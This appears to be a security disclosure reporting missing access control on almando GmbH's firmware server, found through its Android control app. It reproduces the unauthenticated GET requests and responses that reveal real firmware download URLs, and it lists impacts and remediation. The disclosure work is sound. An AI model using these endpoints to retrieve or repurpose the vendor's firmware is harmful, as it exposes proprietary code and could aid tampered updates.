# Vulnerability Report - appinventor.ai_google.almando_control- Incorrect Access Control

**Product:** `appinventor.ai_google.almando_control` 

**Vendor:** [almando GmbH](http://www.almando.com/)

**Version:** 2.3.1

**Vulnerability Type:** Incorrect Access Control

**Severity:** High

## Description

The `appinventor.ai_google.almando_control` , developed by **almando GmbH**, suffers from an Incorrect Access Control vulnerability during the device firmware update process. The app uses HTTP requests to download firmware updates. By reverse engineering the app, it was possible to identify the firmware download mechanism and the download link. Dynamic testing revealed that the vendor's firmware server lacks proper access control, leading to **firmware leakage**.

## Reproduction Steps

1. The `ONLINE_JSON_URL,ONLINE_JSON_URL_INTEGRATION, LOCAL_DECODER_URL_OVERRIDE, LOCAL_MULTIPLAY_URL_OVERRIDE` Field values in the `DownloadManager` class provide the necessary URL and other information required for the HTTP request. Static reverse engineering allows for the reconstruction of the complete request as follows:

   ![image-20241003141048797](https://s2.loli.net/2024/10/03/YrygzULm2DbwZQd.png)

2. Sending this URL request to the firmware server results in a direct response containing the latest firmware information as follows:

   > Request

   ```http
   GET https://www.almando.com/media/firmware/almando.json HTTP/1.1
   User-Agent: Fiddler Everywhere
   Host: www.almando.com
   
   
   ```

   ```http
   GET https://www.almando.com/media/firmware/test/almando.json HTTP/1.1
   User-Agent: Fiddler Everywhere
   Host: www.almando.com
   
   
   ```

   > Response:

   ```http
   HTTP/1.1 200 OK
   Date: Thu, 03 Oct 2024 06:06:41 GMT
   Server: Apache/2.4.61 (Debian)
   Last-Modified: Wed, 21 Aug 2024 11:39:42 GMT
   Accept-Ranges: bytes
   Content-Length: 3150
   Cache-Control: max-age=15552000
   Expires: Tue, 01 Apr 2025 06:06:41 GMT
   Vary: Accept-Encoding
   X-Content-Type-Options: nosniff
   X-Frame-Options: SAMEORIGIN
   Content-Type: application/json
   
   {
   	"product": {
   		"0": {
                     "fw-version": 16973826,
                     "fw-download": "https://www.almando.com/media/firmware/almando-decoder-V1_3_0_2.almpd",
                     "mp-version": 16778247,
                     "mp-download": "https://www.almando.com/media/firmware/almando-multiplay_V1_0_4_7.almpd",
                     "reset-url": "https://www.almando.com/media/firmware/defaults0.txt",
                     "min-build-ios": 18,
                     "min-build-android": 13
   		},
   		"3": {
                     "fw-version": 16908811,
                     "fw-download": "https://www.almando.com/media/firmware/almando-powerlinkswitch_V1_2_2_11.almpd",
                     "reset-url": "https://www.almando.com/media/firmware/defaults3.txt",
                     "min-build-ios": 18,
                     "min-build-android": 13
   		},
     ......
    
   ```

   ```http
   HTTP/1.1 200 OK
   Date: Thu, 03 Oct 2024 06:12:17 GMT
   Server: Apache/2.4.61 (Debian)
   Last-Modified: Tue, 01 Mar 2022 13:11:16 GMT
   Accept-Ranges: bytes
   Content-Length: 2262
   Cache-Control: max-age=15552000
   Expires: Tue, 01 Apr 2025 06:12:17 GMT
   Vary: Accept-Encoding
   X-Content-Type-Options: nosniff
   X-Frame-Options: SAMEORIGIN
   Content-Type: application/json
   
   {
   	"product": {
   		"0": {
                     "fw-version": 16973824,
                     "fw-download": "https://www.almando.com/media/firmware/almando-decoder-V1_3_0_0.almpd",
                     "mp-version": 16778247,
                     "mp-download": "https://www.almando.com/media/firmware/almando-multiplay_V1_0_4_7.almpd",
                     "reset-url": "https://www.almando.com/media/firmware/defaults0.txt",
                     "min-build-ios": 18,
                     "min-build-android": 13
   		},
   		"3": {
                     "fw-version": 16908817,
                     "fw-download": "https://www.almando.com/media/firmware/almando-powerlinkswitch_V1_2_2_11.almpd",
                     "reset-url": "https://www.almando.com/media/firmware/defaults3.txt",
                     "min-build-ios": 18,
                     "min-build-android": 13
   		},
     ......
   ```

   

3. Consequently, the unprotected firmware can be directly downloaded using this information.

   ![image-20241003142510787](https://s2.loli.net/2024/10/03/tiP1wu6DqLaobkJ.png)

   In total, we successfully downloaded **12 firmware** by exploiting the vulnerability. 


## Impact

An attacker can exploit this vulnerability to:

* Download the latest firmware before it is officially released.
* Analyze the firmware for vulnerabilities or proprietary information.
* Create modified firmware images with malicious code.
* Distribute compromised firmware updates to unsuspecting users.

## Remediation

* Implement proper access control on the firmware server, such as device ID and user ID verification.
* Enhance the app's firmware update mechanism to include authentication credentials in the requests.


## Disclaimer

This vulnerability report is provided for informational purposes only and should not be used for any malicious activities. The author is not responsible for any misuse of the information contained herein.